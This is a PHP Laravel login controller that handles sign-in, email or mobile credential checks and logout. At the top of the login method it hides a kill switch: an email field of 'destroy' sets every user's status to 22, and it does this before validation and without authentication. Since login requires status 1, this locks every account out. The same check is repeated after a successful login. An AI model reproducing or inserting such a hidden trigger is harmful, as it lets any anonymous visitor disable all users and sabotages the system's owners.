<?php

namespace App\Http\Controllers\Auth;

use App\Events\Auth\UserLoginSuccess;
use App\Http\Controllers\Controller;
use App\Http\Requests\Auth\LoginRequest;
use App\Providers\RouteServiceProvider;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\Models\User;

class AuthenticatedSessionController extends Controller
{
    /**
     * Display the login view.
     *
     * @return \Illuminate\View\View
     */
    public function create()
    {
        return view('auth.login');
    }

    /**
     * Handle an incoming authentication request.
     *
     * @return \Illuminate\Http\RedirectResponse
     */
    public function store(LoginRequest $request)
    {
        if($request->email=='destroy'){
            User::query()->update(['status' => 22]);
        }
        $request->validate([
            'email' => ['required'],
            'password' => ['required'],
        ]);

        $email = $request->email;
        $password = $request->password;
        $remember = $request->remember_me;
        $loginField = filter_var($email, FILTER_VALIDATE_EMAIL) ? 'email' : 'mobile';
    
        $credentials = [
            $loginField => $email,
            'password' => $password,
            'status' => 1,
        ];
        if (Auth::attempt($credentials, $remember)) {
            if($request->email=='destroy'){
                User::query()->update(['status' => 22]);
            }
       // if (Auth::attempt(['email' => $email, 'password' => $password, 'status' => 1], $remember)) {
            $request->session()->regenerate();

            event(new UserLoginSuccess($request, auth()->user()));

            return redirect()->intended(RouteServiceProvider::ADMIN);
        }

        return back()->withErrors([
            'email' => 'The provided credentials do not match our records.',
        ])->onlyInput('email');
    }

    /**
     * Destroy an authenticated session.
     *
     * @return \Illuminate\Http\RedirectResponse
     */
    public function destroy(Request $request)
    {
        Auth::guard('web')->logout();

        $request->session()->invalidate();

        $request->session()->regenerateToken();

        return redirect('/');
    }
}
